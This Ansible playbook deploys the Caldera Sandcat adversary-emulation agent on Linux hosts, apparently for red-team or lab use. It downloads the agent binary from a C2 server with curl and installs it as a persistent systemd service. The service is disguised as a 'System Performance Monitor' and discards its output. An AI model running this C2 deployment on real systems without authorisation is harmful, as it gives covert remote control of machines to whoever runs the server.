---
# Deploys the Caldera Sandcat agent on Debian 13 and Ubuntu 24.04
# Sandcat is pulled directly from the running Caldera server — no pre-staging needed.

- name: "[Caldera/Linux] Install prerequisites"
  package:
    name:
      - curl
      - wget
    state: present

- name: "[Caldera/Linux] Download Sandcat binary from Caldera server"
  shell: |
    curl -s -X POST \
      -H "file:sandcat.go-linux" \
      -H "platform:linux" \
      "http://{{ caldera_c2_ip }}:{{ caldera_c2_port }}/file/download" \
      -o "{{ caldera_linux_bin_path }}"
  args:
    creates: "{{ caldera_linux_bin_path }}"

- name: "[Caldera/Linux] Make binary executable"
  file:
    path: "{{ caldera_linux_bin_path }}"
    mode: "0755"

- name: "[Caldera/Linux] Install systemd service"
  copy:
    dest: "/etc/systemd/system/{{ caldera_linux_service_name }}.service"
    mode: "0644"
    content: |
      [Unit]
      Description=System Performance Monitor
      After=network-online.target
      Wants=network-online.target

      [Service]
      ExecStart={{ caldera_linux_bin_path }} -server http://{{ caldera_c2_ip }}:{{ caldera_c2_port }} -group {{ caldera_group }} -v
      Restart=always
      RestartSec=10
      StandardOutput=null
      StandardError=null

      [Install]
      WantedBy=multi-user.target

- name: "[Caldera/Linux] Enable and start service"
  systemd:
    name: "{{ caldera_linux_service_name }}"
    enabled: true
    state: started
    daemon_reload: true

- name: "[Caldera/Linux] Verify service is active"
  command: "systemctl is-active {{ caldera_linux_service_name }}"
  register: caldera_svc_state
  changed_when: false

- name: "[Caldera/Linux] Print service state"
  debug:
    msg: "Caldera service state on {{ inventory_hostname }}: {{ caldera_svc_state.stdout }}"
